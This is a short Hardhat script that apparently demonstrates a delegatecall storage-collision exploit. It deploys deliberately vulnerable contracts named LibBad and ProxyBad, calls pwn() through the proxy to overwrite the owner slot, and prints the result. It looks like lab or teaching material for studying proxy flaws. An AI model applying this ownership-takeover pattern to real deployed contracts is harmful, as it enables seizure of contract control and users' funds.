const { ethers } = require("hardhat");
async function main(){
  const [attacker] = await ethers.getSigners();
  const Lib = await ethers.getContractFactory("LibBad");
  const lib = await Lib.deploy(); await lib.deployed();

  const Proxy = await ethers.getContractFactory("ProxyBad");
  const proxy = await Proxy.deploy(lib.address); await proxy.deployed();

  // call pwn() selector on proxy which delegatecalls into LibBad and overwrites owner
  const iface = new ethers.utils.Interface(["function pwn()"]);
  const tx = await attacker.sendTransaction({to: proxy.address, data: iface.encodeFunctionData("pwn", [])});
  await tx.wait();

  const ownerSlot = await ethers.provider.getStorageAt(proxy.address, 0);
  console.log("Proxy owner slot0 now:", ownerSlot);
}
main().catch(console.error);
